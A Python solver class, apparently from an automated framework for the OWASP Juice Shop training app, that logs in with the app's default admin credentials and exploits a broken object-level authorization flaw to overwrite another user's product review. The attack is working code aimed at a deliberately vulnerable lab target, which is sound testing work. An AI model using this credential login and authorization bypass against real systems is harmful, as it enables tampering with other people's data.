from core.base_solver import BaseSolver
from loguru import logger
import random

class ForgedReviewSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "forgedReviewChallenge"

    def solve(self) -> bool:
        # 1. Login
        email = "admin@juice-sh.op"
        login_res = self.client.post("/rest/user/login", json={"email": email, "password": "admin123"})
        auth_data = login_res.json().get("authentication", {})
        token = auth_data.get("token")
        if not token: 
            logger.error("Login failed")
            return False
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Find target review not by current user
        target_id = None
        # Try some products to find a review by another user
        for product_id in range(1, 20):
            res = self.client.get(f"/rest/products/{product_id}/reviews")
            if res.status_code != 200:
                continue
            reviews = res.json().get("data", [])
            for r in reviews:
                if r.get("author") != email:
                    target_id = r.get("_id")
                    logger.info(f"Found review by {r.get('author')} on product {product_id}")
                    break
            if target_id:
                break
        
        if not target_id:
             logger.warning("No review found by another user to forge.")
             return False

        # 3. Attack BOLA
        payload = {"id": target_id, "message": "This review has been forged by Antigravity"}
        res = self.client.patch("/rest/products/reviews", json=payload, headers=headers)
        
        if res.status_code == 200:
            logger.success(f"Forged review {target_id} successfully")
            return True
        else:
            logger.error(f"Failed to forge review: {res.status_code}")
            return False

